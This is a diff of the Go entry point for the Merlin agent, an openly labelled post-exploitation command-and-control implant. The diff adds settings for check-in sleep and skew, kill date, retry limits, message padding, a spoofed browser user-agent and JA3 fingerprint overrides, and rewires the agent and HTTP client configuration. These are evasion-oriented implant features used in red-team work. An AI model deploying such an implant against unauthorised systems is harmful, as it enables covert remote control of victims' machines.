@@ -1,6 +1,6 @@
 // Merlin is a post-exploitation command and control framework.
 // This file is part of Merlin.
-// Copyright (C) 2019  Russel Van Tuyl
+// Copyright (C) 2021  Russel Van Tuyl
 
 // Merlin is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -22,14 +22,14 @@ import (
 	"flag"
 	"fmt"
 	"os"
-	"time"
 
 	// 3rd Party
 	"github.com/fatih/color"
 
-	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg"
+	// Internal
 	"github.com/Ne0nd0g/merlin/pkg/agent"
+	"github.com/Ne0nd0g/merlin/pkg/agent/clients/http"
+	"github.com/Ne0nd0g/merlin/pkg/agent/core"
 )
 
 // GLOBAL VARIABLES
@@ -40,6 +40,13 @@ var psk = "merlin"
 var proxy = ""
 var host = ""
 var ja3 = ""
+var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
+var sleep = "30s"
+var skew = "3000"
+var killdate = "0"
+var maxretry = "7"
+var padding = "4096"
+var opaque []byte
 
 func main() {
 	verbose := flag.Bool("v", false, "Enable verbose output")
@@ -51,31 +58,68 @@ func main() {
 	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
 	flag.StringVar(&host, "host", host, "HTTP Host header")
 	flag.StringVar(&ja3, "ja3", ja3, "JA3 signature string (not the MD5 hash). Overrides -proto flag")
-	sleep := flag.Duration("sleep", 30000*time.Millisecond, "Time for agent to sleep")
+	flag.StringVar(&sleep, "sleep", sleep, "Time for agent to sleep")
+	flag.StringVar(&skew, "skew", skew, "Amount of skew, or variance, between agent checkins")
+	flag.StringVar(&killdate, "killdate", killdate, "The date, as a Unix EPOCH timestamp, that the agent will quit running")
+	flag.StringVar(&maxretry, "maxretry", maxretry, "The maximum amount of failed checkins before the agent will quit running")
+	flag.StringVar(&padding, "padding", padding, "The maximum amount of data that will be randomly selected and appended to every message")
+	flag.StringVar(&useragent, "useragent", useragent, "The HTTP User-Agent header string that Agent will use while sending traffic")
+
 	flag.Usage = usage
 	flag.Parse()
 
 	if *version {
-		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", merlin.Version))
+		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", core.Version))
 		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", build))
 		os.Exit(0)
 	}
 
+	core.Debug = *debug
+	core.Verbose = *verbose
+
 	// Setup and run agent
-	a, err := agent.New(protocol, url, host, psk, proxy, ja3, *verbose, *debug)
+	agentConfig := agent.Config{
+		Sleep:    sleep,
+		Skew:     skew,
+		KillDate: killdate,
+		MaxRetry: maxretry,
+	}
+	a, err := agent.New(agentConfig)
 	if err != nil {
 		if *verbose {
 			color.Red(err.Error())
 		}
 		os.Exit(1)
 	}
-	a.WaitTime = *sleep
-	errRun := a.Run()
-	if errRun != nil {
+
+	// Get the client
+	var errClient error
+	clientConfig := http.Config{
+		AgentID:     a.ID,
+		Protocol:    protocol,
+		Host:        host,
+		URL:         url,
+		Proxy:       proxy,
+		UserAgent:   useragent,
+		PSK:         psk,
+		JA3:         ja3,
+		Padding:     padding,
+		AuthPackage: "opaque",
+		Opaque:      opaque,
+	}
+	a.Client, errClient = http.New(clientConfig)
+	if errClient != nil {
 		if *verbose {
-			color.Red(errRun.Error())
+			color.Red(errClient.Error())
 		}
-		os.Exit(1)
+	}
+
+	// Start the agent
+	err = a.Run()
+	if err != nil {
+		if *verbose {
+			color.Red(err.Error())
+		}
 	}
 }
 
